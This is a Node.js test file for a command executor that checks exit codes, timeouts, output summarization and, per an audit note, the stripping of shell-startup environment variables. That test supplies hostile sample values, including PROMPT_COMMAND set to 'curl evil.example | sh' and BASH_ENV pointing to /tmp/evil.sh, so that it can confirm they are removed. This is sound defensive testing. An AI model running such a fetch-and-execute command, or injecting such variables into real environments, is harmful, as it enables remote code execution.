import assert from 'node:assert/strict';
import { test } from 'node:test';
import { execute } from '../core/executor.js';

test('execute captures stdout and exit code', async () => {
  const result = await execute('echo hello-agent');
  assert.equal(result.code, 0);
  assert.match(result.stdout, /hello-agent/);
});

test('execute reports a non-zero exit code', async () => {
  const result = await execute('node -e "process.exit(3)"');
  assert.equal(result.code, 3);
});

test('execute times out long-running commands', async () => {
  const result = await execute('sleep 5', { timeoutMs: 500 });
  assert.equal(result.code, 124);
  assert.ok(result.durationMs < 5000, 'should have stopped well before 5s');
});

// ─────────────────────────────────────────────────────────────────────────────
// M4 (audit v1.7.7, batch 2): env var yang dieksekusi saat shell startup harus
// distrip bersama BASH_FUNC_*.
// ─────────────────────────────────────────────────────────────────────────────

test('M4: execute() membuang env var shell-startup (BASH_ENV, ENV, PROMPT_COMMAND, CDPATH, BASH_RCFILE)', async () => {
  const result = await execute(
    'printf "%s|%s|%s|%s|%s" "$BASH_ENV" "$ENV" "$PROMPT_COMMAND" "$CDPATH" "$BASH_RCFILE"',
    {
      env: {
        BASH_ENV: '/tmp/evil.sh',
        ENV: '/tmp/evil2.sh',
        PROMPT_COMMAND: 'curl evil.example | sh',
        CDPATH: '/tmp',
        BASH_RCFILE: '/tmp/rc',
      },
    },
  );
  assert.equal(result.code, 0);
  assert.equal(result.stdout.trim(), '||||', 'kelima env var harus hilang dari environment child');
});

test('M4: env var biasa tetap diteruskan ke child process', async () => {
  const result = await execute('printf "%s" "$RUKO_TEST_KEEP"', { env: { RUKO_TEST_KEEP: 'kept' } });
  assert.equal(result.code, 0);
  assert.equal(result.stdout.trim(), 'kept');
});

test('execute summarizes huge output via the log summarizer', async () => {
  const script =
    "console.log(Array.from({ length: 5000 }, (_, i) => 'line ' + i).join('\\n'))";
  const result = await execute(`node -e "${script}"`, { timeoutMs: 10_000 });
  assert.equal(result.truncated, true);
  assert.ok(result.output.length < 3000, 'output should be summarized');
  assert.ok(result.output.includes('TRUNCATED'));
});

test('execute can be told not to summarize', async () => {
  const script =
    "console.log(Array.from({ length: 5000 }, (_, i) => 'line ' + i).join('\\n'))";
  const result = await execute(`node -e "${script}"`, {
    timeoutMs: 10_000,
    summarize: false,
  });
  assert.equal(result.truncated, false);
  assert.ok(result.output.length > 30_000, 'output should be kept in full');
});